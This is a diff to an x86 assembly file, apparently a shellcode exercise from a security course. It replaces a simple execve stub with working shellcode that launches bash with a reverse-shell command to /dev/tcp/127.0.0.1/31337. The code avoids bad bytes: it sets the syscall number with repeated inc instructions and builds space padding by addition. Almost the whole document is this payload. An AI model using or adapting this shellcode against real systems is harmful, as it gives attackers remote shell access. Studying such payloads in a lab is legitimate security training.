@@ -44,25 +44,66 @@ _start:
 #endif
 
 // YOUR ASSEMBLY GOES HERE
-push   $0xb
-push   $0xb
-pop    %eax # eax=0xb
-cltd        # zero edx
-push   %edx # push zero termination
-#push   $0x68732f2f
-#push   $0x6e69622f
+xor    %eax, %eax
 
+push   %eax # push zero termination
 push $0x68736162
 push $0x2f2f2f2f
 push $0x6e69622f # /bin/bash padded to alignment
+mov %esp,%ebx # ebx = str_location
 
-push %edx
+push %eax   #null
+push $0x31263e30 # 0>&1
 
+#push $0x20202020
+xor %ebp, %ebp
+add $0x10101010, %ebp
+add $0x10101010, %ebp
+push %ebp
 
-mov    %esp,%ebx # New stackfram
-push   %edx      # zero edx
+push $0x37333331
+push $0x332f312e
+push $0x302e302e
+push $0x3732312f
+push $0x7063742f
+push $0x7665642f
+push $0x263e492d
+
+#push $0x20202020
+#xor %ebp, %ebp
+#add $0x10101010, %ebp
+#add $0x10101010, %ebp
+push %ebp
+
+push $0x68736162 #bash
+
+mov %esp, %ebp # ebp = arg2
+
+push %eax   #null
+push $0x6368682d # -hhc
+mov %esp, %ecx # ecx = arg2
+
+push %eax   #null
+push %ebp
+push %ecx
+push %ebx       #arg0
+mov %esp, %ecx
+
+xor   %edx,%edx      # zero edx
 push   %ebx      # zero ebx
-mov    %esp,%ecx # ecx = str_location
+#mov $11, %eax
+xor   %eax,%eax      # avoid vt character
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
+inc %eax
 int    $0x80
 
 #ifdef TEST
@@ -73,8 +114,6 @@ ret
 #endif
 
 // YOUR LABELED DATA GOES HERE, LIKE
-label:
-.long 0xABCD123
 
 end:
 
